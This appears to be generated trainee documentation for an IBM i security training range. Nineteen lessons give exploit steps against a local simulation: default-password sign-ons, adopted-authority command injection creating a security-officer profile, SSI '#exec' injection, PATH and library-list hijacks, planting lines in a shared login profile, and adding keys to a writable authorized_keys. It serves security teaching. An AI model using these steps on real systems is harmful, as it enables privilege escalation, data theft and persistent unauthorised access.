# Silverlake scenarios (trainee)

Each lesson says where to look, what is wrong and how to prove it. The fixes are left out.

Generated by `python -m silverlake.scenario_docs` from `src/silverlake/data/scenarios/`. Do not edit by hand.
Flags are checked with `./check-flags.sh`; see [flags in the README](../README.md).

## Group A: Reconnaissance and credentials

### 1. Every password is the profile name

**Where:** 5250 sign-on screen, any profile

**Real-world parallel:** Default and guessable passwords are among the most common findings in any platform's security review, IBM i included, where a profile name used as its own password is the textbook case.

**Vulnerability:** Every seeded profile has its own name as its password and the password rules are off (minimum length 1, no digit required), so the first guess works for QSECOFR, SECADMIN, OPERATOR and DEVELOPER.

**MITRE ATT&CK:** T1078 Valid Accounts, T1110.001 Brute Force: Password Guessing

**Exploit:**

1. Sign on as OPERATOR with the password OPERATOR. It works.
2. Sign off and sign on as QSECOFR with the password QSECOFR.
3. Find the security officer's job log among its spooled files and display it.

**Consequence in the sim:** Full control of the system, and the change ticket reference in the job log.

**Flag:** Sign on as the security officer and find the change ticket in its printed job log.

### 2. Service and legacy accounts hold power they do not need

**Where:** 5250 sign-on, service and legacy profiles

**Real-world parallel:** Service accounts and long-forgotten project profiles holding *ALLOBJ are a staple of IBM i audits. They are rarely used and rarely reviewed, so their passwords stay at defaults.

**Vulnerability:** SVCACCT holds *ALLOBJ, LEGACY holds *ALLOBJ and *JOBCTL, and DEVADMIN holds *SECADM, none of which they need. Their passwords are weak.

**MITRE ATT&CK:** T1078.003 Valid Accounts: Local Accounts, T1548 Abuse Elevation Control Mechanism

**Exploit:**

1. WRKUSRPRF shows the profiles; DSPUSRPRF SVCACCT shows the special authority.
2. Sign on as SVCACCT (the password is the profile name).
3. DSPPFM FILE(APPLIB/VAULT) reads a file that excludes everyone else.

**Consequence in the sim:** *ALLOBJ skips every object authority check, so one weak password opens everything.

**Flag:** Use a service account that holds more than it needs to read the vault file in APPLIB.

### 3. The operator's message queue tells everyone who is running what

**Where:** Message queue QSYS/QSYSOPR

**Real-world parallel:** The operator's queue collects events about everyone's jobs. Left readable by all, it tells an attacker who is running what and sometimes more.

**Vulnerability:** QSYSOPR is *PUBLIC *CHANGE. A plain profile can read it, learns job names and users, and finds a message with the save passphrase in it.

**MITRE ATT&CK:** T1057 Process Discovery, T1087 Account Discovery, T1552 Unsecured Credentials

**Exploit:**

1. Sign on as STUDENT.
2. DSPMSG MSGQ(QSYSOPR) shows every message on the queue.

**Consequence in the sim:** Reconnaissance on accounts and jobs, and a secret that should never have been typed into a message.

**Flag:** As an ordinary user, read the operator's message queue and find tonight's save passphrase.

## Group B: Authority and data exposure

### 4. The locked-down menu with a way out

**Where:** 5250 session of the CLERK profile

**Real-world parallel:** A profile locked to a menu with limited capabilities is only as strong as the menu. A maintenance option left behind, or one that calls command entry, undoes it.

**Vulnerability:** CLERK has no command line (LMTCPB(*YES)), but the Clerk Menu option 9 runs CALL QCMD, which opens command entry.

**MITRE ATT&CK:** T1059 Command and Scripting Interpreter, T1078 Valid Accounts

**Exploit:**

1. Sign on as CLERK with the password CLERK. There is no command line.
2. Choose option 9, Maintenance. Command entry opens.
3. DSPPFM FILE(APPLIB/MAINTLOG) reads the notes the clerk is allowed to see.

**Consequence in the sim:** The restriction on the profile is gone: any command the profile's authority allows can now be run.

**Flag:** Sign on as the clerk, get out of the menu, and read the maintenance notes file in APPLIB.

### 5. A copy of a locked file is not locked

**Where:** Command CPYF, library SCRATCH

**Real-world parallel:** Authority to read a file is authority to copy it, and the copy does not carry the original's protection. Data leaves through a copy that nobody locked.

**Vulnerability:** *USE on PAYROLL (a member of PAYAUTL such as OPERATOR) is enough for CPYF to create a copy in a library whose new files get *CHANGE for everyone. The copy belongs to the copier and is not on the authorization list.

**MITRE ATT&CK:** T1074.001 Data Staged: Local Data Staging, T1005 Data from Local System

**Exploit:**

1. Sign on as OPERATOR.
2. CPYF FROMFILE(APPLIB/PAYROLL) TOFILE(SCRATCH/LOOT) CRTFILE(*YES)
3. Sign on as STUDENT and DSPPFM FILE(SCRATCH/LOOT).

**Consequence in the sim:** A readable copy of the payroll data in a library anyone can use. In QTEMP the copy would leave no trace at sign-off.

**Flag:** With an account that may only use PAYROLL, make a copy that an ordinary user can read.

### 6. Anyone can read what is on the default printer queue

**Where:** Output queue QGPL/QPRINT

**Real-world parallel:** Reports sent to the default printer queue are readable by anyone when the queue shows data to everyone, which is the shipped behaviour of QPRINT.

**Vulnerability:** QPRINT has DSPDTA(*YES), so any user who can reach the queue can open another user's spooled file on it. A payroll register is sitting there.

**MITRE ATT&CK:** T1005 Data from Local System, T1083 File and Directory Discovery

**Exploit:**

1. Sign on as STUDENT.
2. WRKOUTQ OUTQ(QGPL/QPRINT) lists the files with their owners.
3. Option 5 on PAYRPT displays the register and its audit tag.

**Consequence in the sim:** Payroll data read by someone with no business reason to see it.

**Flag:** As an ordinary user, read the payroll register on the default output queue and find the audit tag.

### 7. A sensitive report printed to the default queue

**Where:** Program APPLIB/REGRPT and its printer file

**Real-world parallel:** A report job writes to whatever queue its printer file names. A sensitive report that lands on the default queue is as exposed as the queue is.

**Vulnerability:** The printer file REGRPT sends the payroll register to QGPL/QPRINT, where anyone may display it. REGRPTX, which prints to a protected queue, shows the fix.

**MITRE ATT&CK:** T1005 Data from Local System

**Exploit:**

1. Sign on as OPERATOR and CALL PGM(APPLIB/REGRPT). The register is printed.
2. Sign on as STUDENT.
3. WRKOUTQ OUTQ(QGPL/QPRINT), option 5 on the register, and read the report ID in its heading.

**Consequence in the sim:** The whole payroll register readable by an ordinary user.

**Flag:** Run the payroll register as payroll staff, then as an ordinary user find the report ID printed in its heading.

## Group C: Programs and the library list

### 8. Redirecting the file a trusting program opens

**Where:** Program APPLIB/EMPDIR and the OVRDBF command

**Real-world parallel:** An adopting program that opens a file by name trusts the name. An override from the caller can change what the name means.

**Vulnerability:** EMPDIR adopts its owner OPERATOR and opens STAFF by name. OVRDBF needs no authority, and the open of whatever file the override names is checked as the adopted owner, who may read PAYROLL.

**MITRE ATT&CK:** T1548 Abuse Elevation Control Mechanism, T1574 Hijack Execution Flow

**Exploit:**

1. Sign on as STUDENT and ADDLIBLE APPLIB.
2. OVRDBF FILE(STAFF) TOFILE(APPLIB/PAYROLL)
3. CALL PGM(APPLIB/EMPDIR) and look up employee 10099 and read the name.

**Consequence in the sim:** The payroll file, with salaries, shown through a directory program to a user who cannot open it.

**Flag:** Make the staff directory show you the payroll file, and find the audit employee's name.

### 9. A salary screen that adopts an owner who can change everything

**Where:** Program APPLIB/PAYADJ

**Real-world parallel:** A program that adopts an owner with more authority than its job needs, and checks nothing about its caller, lets anyone who can run it do all the owner can.

**Vulnerability:** PAYADJ adopts its owner, who holds authority on PAYROLL, and updates a salary for whoever asks. Any user may call it, because *PUBLIC has *USE on the program.

**MITRE ATT&CK:** T1548 Abuse Elevation Control Mechanism, T1565.001 Data Manipulation: Stored Data Manipulation

**Exploit:**

1. Sign on as STUDENT and ADDLIBLE APPLIB.
2. CALL PGM(APPLIB/PAYADJ).
3. Enter employee number 10004 and a new salary of 99999.

**Consequence in the sim:** Anyone's salary changed by someone with no authority to the payroll file.

**Flag:** As an ordinary user, set employee 10004's salary to 99999.

### 10. Your own program ahead of the one a privileged program calls

**Where:** Program APPLIB/PAYRUN and the library list

**Real-world parallel:** A privileged program that calls another by name alone lets the library list decide which one runs. A library you can write to, ahead of the real one, wins.

**Vulnerability:** PAYRUN adopts its owner and calls PAYCALC with no library. QTEMP is every job's own library and sits ahead of a library added with ADDLIBLE *LAST, so a PAYCALC made there runs first with PAYRUN's authority.

**MITRE ATT&CK:** T1574.008 Hijack Execution Flow: Path Interception by Search Order Hijacking, T1548 Abuse Elevation Control Mechanism

**Exploit:**

1. Sign on as STUDENT. ADDLIBLE APPLIB *LAST.
2. CRTSRCPF FILE(QTEMP/QRPGLESRC), then write a member PAYCALC (type RPGLE) whose code calls QCMDEXC with GRTOBJAUT APPLIB/PAYROLL *FILE STUDENT *USE.
3. CRTBNDRPG PGM(QTEMP/PAYCALC) SRCFILE(QTEMP/QRPGLESRC), then CALL PGM(APPLIB/PAYRUN).

**Consequence in the sim:** STUDENT ends up with authority on PAYROLL that nobody granted. The program is gone at sign-off.

**Flag:** As STUDENT, end up able to read APPLIB/PAYROLL without anyone granting it to you.

### 11. A helper that hands any command to QCMDEXC as QSECOFR

**Where:** Program APPLIB/RUNCMD

**Real-world parallel:** A helper that passes text to QCMDEXC while adopting a powerful owner turns every user who can call it into that owner. The classic way a normal user becomes a security officer.

**Vulnerability:** RUNCMD is owned by QSECOFR, adopts its owner (USRPRF(*OWNER)) and runs whatever is typed through QCMDEXC with that authority.

**MITRE ATT&CK:** T1548 Abuse Elevation Control Mechanism, T1136 Create Account

**Exploit:**

1. Sign on as STUDENT and ADDLIBLE APPLIB.
2. CALL PGM(APPLIB/RUNCMD).
3. Type CRTUSRPRF USRPRF(EVIL) PASSWORD(EVIL) USRCLS(*SECOFR) and press Enter.

**Consequence in the sim:** A new profile with every special authority, made by a user who could not make any profile.

**Flag:** From an ordinary user, create a profile that holds *ALLOBJ.

## Group D: Network services (start with ./start.sh --services)

### 12. Which services take a password in clear text

**Where:** FTP 127.0.0.1:2121 and 2990, console 127.0.0.1:2001 and 2010 (start the range with ./start.sh --services)

**Real-world parallel:** Most IBM i installs run FTP and the web administration console beside their TLS ports and never turn the clear ones off. A password sent that way can be read by anyone on the path, and a review of network services always asks which ports take one. The usual answers are a request exit program, the server's own setting to require TLS, or closing the clear port.

**Vulnerability:** FTP on 2121 takes USER and PASS before AUTH TLS, and the console on 2001 asks for Basic credentials over plain HTTP. Both also have a TLS port, so TLS exists and is simply not required.

**MITRE ATT&CK:** T1040 Network Sniffing, T1078 Valid Accounts, T1021 Remote Services

**Exploit:**

1. Scan the range's ports and note the pairs: 2121 and 2990 for FTP, 2001 and 2010 for the console.
2. ftp 127.0.0.1 2121, USER STUDENT, PASS STUDENT. It signs on. The password crossed the loopback in clear.
3. curl -i -u STUDENT:STUDENT http://127.0.0.1:2001/HTTPAdmin. The console answers with the page. Basic is only base64, so the password is as readable as the FTP one.
4. Optional, needs root: run tcpdump -i lo0 -A port 2121 (lo on Linux) and repeat the FTP login to see PASS STUDENT on the wire.
5. Repeat both on the TLS ports (explicit AUTH TLS on 2121, or 2990, and https on 2010 with --cacert .tls/cert.pem) and confirm the sign-on works there and the capture shows nothing readable.
6. Submit the names of the services that signed you on without TLS.

**Consequence in the sim:** Anyone able to see the traffic reads a profile name and password and signs on as that person, with all their authority. A limited profile is still limited, but a powerful one is not.

**Flag:** Find out which of FTP and the HTTP console take a sign-on without TLS. Submit their names, lower case, sorted and joined by a comma (ftp,httpadmin), or none when neither does.

### 13. A clerk with no command line who can still use FTP

**Where:** FTP server, 127.0.0.1:2121 (start the range with ./start.sh --services)

**Real-world parallel:** Limiting a profile's capabilities stops it at the 5250 command line, and only there. Every other way in, FTP among them, applies the profile's authority and nothing more. It is a standard finding on IBM i reviews, and the usual remedy is an FTP exit program.

**Vulnerability:** CLERK has LMTCPB(*YES) and the menu offers no way out, but CLERK has *USE on APPLIB/DAILYOPS and the FTP server does not know what limited capability is. The password is the profile name, and FTP sends it in clear text.

**MITRE ATT&CK:** T1078 Valid Accounts, T1021 Remote Services, T1005 Data from Local System

**Exploit:**

1. Sign on to the 5250 as CLERK (the password is the profile name) and confirm there is no command line.
2. ftp 127.0.0.1 2121 and log in as CLERK with the same password.
3. cd APPLIB, then ls. DAILYOPS is listed.
4. get DAILYOPS and read the file.

**Consequence in the sim:** The clerk, who was never meant to leave the menu, reads the operations notes. The restriction held in one place and not in the other.

**Flag:** Use the clerk's own password over FTP to read the daily operations notes in APPLIB.

### 14. The sign-on server that says how passwords are checked

**Where:** Host server mapper 127.0.0.1:4449 and sign-on server 127.0.0.1:8476 (start the range with ./start.sh --services)

**Real-world parallel:** The IBM i host servers answer a client's opening exchange before any password is checked, and the answer carries the OS release and the password level (QPWDLVL). Scanners and audit tools read it first. A level of 0 or 1 tells the caller that passwords are 10 characters at most and that case does not matter.

**Vulnerability:** QPWDLVL is 0, so passwords are not case sensitive. The sign-on server reports that level to anyone who asks, with no sign-on.

**MITRE ATT&CK:** T1046 Network Service Discovery, T1592 Gather Victim Host Information, T1110 Brute Force

**Exploit:**

1. Ask the server mapper on 4449 where the sign-on server is: send the name as-signon. It answers with the port, 8476.
2. Send the sign-on server the exchange of attributes request. It answers with the release, the datastream level, a seed, the password level and the answering job.
3. Read the release and the password level from the reply. No profile or password was needed.
4. Use what it told you: at level 0 the case of a password does not matter, so sign on to the 5250 as STUDENT with the password student in lower case.

**Consequence in the sim:** The caller learns how weak the password rules are before trying a single password, and a guess can ignore case.

**Flag:** Without signing on, read the OS release and the password level from the sign-on server, and submit them as release/level, for example V7R4M0/0.

### 15. A web console that runs commands found in a description

**Where:** HTTP Server Administration console, 127.0.0.1:2001 (start the range with ./start.sh --services)

**Real-world parallel:** A console that builds a page from a field an administrator typed, and evaluates what it finds there, turns a form into a command line. This is the weakness class of the 2026 IBM i HTTP Server Administration advisory, which needed only a low privilege account. Silverlake models the class, not the real parameter, which IBM has not published.

**Vulnerability:** Create HTTP Server takes a description and the Manage page evaluates <!--#exec cmd="..." --> in it with no escaping. The command runs as QTMHHTTP, not as the person signed in. Any enabled profile can sign in, and the passwords are the profile names.

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter, T1078 Valid Accounts

**Exploit:**

1. Find the console with a port scan of 127.0.0.1 or by trying 2001. Browse to /HTTPAdmin and sign in as STUDENT with the password STUDENT.
2. Open Create HTTP Server. Name it ZZTEST and put <!--#exec cmd="DSPMSG MSGQ(QTMHHTTP)" --> in the description. Submit.
3. Open Manage. The page shows what the command printed, run as QTMHHTTP. Read the message.
4. From 5250 as STUDENT, DSPMSG MSGQ(QTMHHTTP) is refused. The web console reached what STUDENT cannot.

**Consequence in the sim:** An ordinary profile reads the message queue of a system profile, and could run anything that profile may. The flag is in that queue.

**Flag:** Through the web console on port 2001, make a server description run a command as the web server's profile and read its message queue.

## Group E: PASE and the IFS

### 16. A writable directory at the front of the operator's PATH

**Where:** PASE terminal, CALL PGM(QP2TERM) from any 5250 session

**Real-world parallel:** A shell finds a command by walking PATH in order and running the first match. If a directory that anyone can write sits before the real one, a file named like a system command wins, and it runs as whoever typed the command. It is one of the oldest local privilege escalations there is.

**Vulnerability:** OPERATOR's ~/.profile sets PATH=/tmp/opsbin:$PATH and then runs id. /tmp/opsbin is owned by OPERATOR with public rwx. OPERATOR may read APPLIB/PAYROLL, and STUDENT may not.

**MITRE ATT&CK:** T1574.007 Hijack Execution Flow: Path Interception by PATH Environment Variable, T1068 Exploitation for Privilege Escalation, T1005 Data from Local System

**Exploit:**

1. Sign on as STUDENT, CALL PGM(QP2TERM), and ls -ld /tmp/opsbin. Everyone may write there.
2. echo 'cp /QSYS.LIB/APPLIB.LIB/PAYROLL.FILE /tmp/ops.txt' > /tmp/opsbin/id
3. chmod 755 /tmp/opsbin/id. Without x it is only text, and the shell skips it.
4. Sign on to a second session as OPERATOR (password OPERATOR) and run CALL PGM(QP2TERM). The profile runs id, finds yours first, and runs it as OPERATOR.
5. Back as STUDENT, cat /tmp/ops.txt.

**Consequence in the sim:** STUDENT reads payroll rows through the operator's authority, and the operator saw nothing but a normal login.

**Flag:** As STUDENT, get a copy of the payroll file into the IFS that STUDENT can read, by making the operator's own login do the copying. Then play the operator: sign on as OPERATOR and run CALL PGM(QP2TERM).

### 17. The system profile that anyone can write and every login runs

**Where:** PASE terminal, CALL PGM(QP2TERM) from any 5250 session

**Real-world parallel:** A login shell runs the system profile before the user's own, as the user who is logging in. A system profile that anyone can write is a shared trigger: whoever logs in next runs what was put there, with their own authority. It is a standard finding on Unix and AIX reviews and PASE inherits it.

**Vulnerability:** /QOpenSys/etc/profile has public write. STUDENT has no authority over APPLIB/PAYROLL, but QSECOFR has all object authority, and QSECOFR's next PASE login runs every line of the profile.

**MITRE ATT&CK:** T1546.004 Event Triggered Execution: Unix Shell Configuration Modification, T1068 Exploitation for Privilege Escalation, T1005 Data from Local System

**Exploit:**

1. Sign on as STUDENT and run CALL PGM(QP2TERM). Try cat /QSYS.LIB/APPLIB.LIB/PAYROLL.FILE and read the refusal.
2. ls -l /QOpenSys/etc. The profile has rw- for everyone.
3. echo 'cp /QSYS.LIB/APPLIB.LIB/PAYROLL.FILE /tmp/pay.txt' >> /QOpenSys/etc/profile
4. Sign on to a second session as QSECOFR (password QSECOFR) and run CALL PGM(QP2TERM). The login runs the planted line as QSECOFR.
5. Back as STUDENT, cat /tmp/pay.txt. The payroll rows are there, and STUDENT never had the authority to read them.

**Consequence in the sim:** An account with no authority over the payroll file reads it, because a privileged login did the copying. The plant leaves the profile changed for every later login too.

**Flag:** As STUDENT, get a copy of the payroll file into the IFS that STUDENT can read, without STUDENT ever being allowed to read APPLIB/PAYROLL. Then play the security officer: open a second session as QSECOFR and run CALL PGM(QP2TERM).

### 18. A clerk with no command line who can still open a shell over ssh

**Where:** ssh listener, 127.0.0.1:2222 (start the range with ./start.sh --services, with asyncssh installed)

**Real-world parallel:** Limited capability is a rule of the 5250 command line. A profile with LMTCPB(*YES) still has all the authority it was given, and any other way in (FTP, ODBC, ssh) applies that authority and nothing more. The ftp-limited-bypass lesson shows it with FTP, this one with a shell.

**Vulnerability:** CLERK has LMTCPB(*YES) and a menu with no way out, but CLERK may read APPLIB/DAILYOPS, and the daemon lets any enabled profile log in. The password is the profile name.

**MITRE ATT&CK:** T1078 Valid Accounts, T1021.004 Remote Services: SSH, T1005 Data from Local System

**Exploit:**

1. Confirm at the 5250 that CLERK has no command line.
2. ssh -p 2222 CLERK@127.0.0.1 and use CLERK as the password.
3. cat /QSYS.LIB/APPLIB.LIB/DAILYOPS.FILE, or db2 "select * from applib.dailyops", or system 'DSPLIBL'.
4. Read the ticket.

**Consequence in the sim:** The clerk who could not leave a menu has a shell, SQL and CL, all with the clerk's own authority.

**Flag:** Use the clerk's own password over ssh to read the shell access review ticket in APPLIB/DAILYOPS.

### 19. A key file anyone can write, and an ssh daemon that does not mind

**Where:** ssh listener, 127.0.0.1:2222 (start the range with ./start.sh --services, with asyncssh installed)

**Real-world parallel:** OpenSSH only trusts a key file that nobody but the owner can write, because a key file is a list of who may log in. Turning that check off (StrictModes no) is sometimes done to make a deployment work, and it turns a permissions slip into an account takeover.

**Vulnerability:** /home/DEVELOPER/.ssh/authorized_keys is writable by everyone, and the daemon's StrictModes is no. STUDENT can read the directory and write the file.

**MITRE ATT&CK:** T1098.004 Account Manipulation: SSH Authorized Keys, T1021.004 Remote Services: SSH, T1078 Valid Accounts

**Exploit:**

1. ssh-keygen -t ed25519 -f demo_key -N '' makes a key pair on your own machine.
2. Sign on to the 5250 as STUDENT, CALL PGM(QP2TERM), and ls -l /home/DEVELOPER/.ssh. The key file has rw- for everyone.
3. cat /QOpenSys/etc/ssh/sshd_config.d/10-modes.conf shows StrictModes no.
4. echo 'ssh-ed25519 AAAA... you' >> /home/DEVELOPER/.ssh/authorized_keys, with your own public key from demo_key.pub.
5. ssh -p 2222 -i demo_key DEVELOPER@127.0.0.1 and then cat secret.txt.

**Consequence in the sim:** STUDENT becomes DEVELOPER without knowing a password, and the key stays behind as a way back in.

**Flag:** Get into DEVELOPER's account over ssh without DEVELOPER's password, and read the deploy token in /home/DEVELOPER/secret.txt.
